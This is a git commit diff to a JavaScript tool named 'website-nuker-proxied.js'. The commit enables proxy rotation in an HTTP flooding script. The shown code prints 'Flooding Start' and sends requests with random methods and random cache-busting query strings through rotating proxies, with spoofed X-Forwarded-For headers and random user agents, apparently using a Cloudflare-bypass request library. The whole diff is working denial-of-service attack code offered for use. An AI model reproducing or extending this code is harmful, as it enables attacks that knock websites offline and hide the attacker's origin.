136d1583e4ef01ccc6cba7e6867c604de8e43273
z3ntl3 root <48758770+Z3NTL3@users.noreply.github.com>
2021-06-24 16:45:54 +0200

    Add files via upload

--- website-nuker-proxied.js
+++ website-nuker-proxied.js
@@ -20,20 +20,20 @@ if (process.argv.length !== 4) {
 const target = process.argv[2],
     time = process.argv[3];
 console.log("Flooding Start")
-//let proxies = fs.readFileSync('proxies.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
+let proxies = fs.readFileSync('proxies.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
 function randomNumber(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function send_req() {
-	//let proxy = proxies[Math.floor(Math.random() * proxies.length)];
+	let proxy = proxies[Math.floor(Math.random() * proxies.length)];
 		var Array_method = ['HEAD',  'GET',  'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'DEL'];
 		var randommethod = Array_method[Math.floor(Math.random()*Array_method.length)];
 		cf.request({
 			method: randommethod,
 			resolveWithFullResponse: true,
 			headers: {'User-Agent': random_useragent.getRandom(),'Referer': target,'Connection':'Keep-Alive','Keep-Alive': 'timeout=10, max=100','X-Forwarded-For': randomNumber(1, 255)+'.'+randomNumber(1, 255)+'.'+randomNumber(1, 255)+'.'+randomNumber(1, 255),},
-			//proxy: 'http://' + proxy,
+			proxy: 'http://' + proxy,
 			uri: target + '?' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16})+ '&' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}),
 		}).then(res => {});	}
 
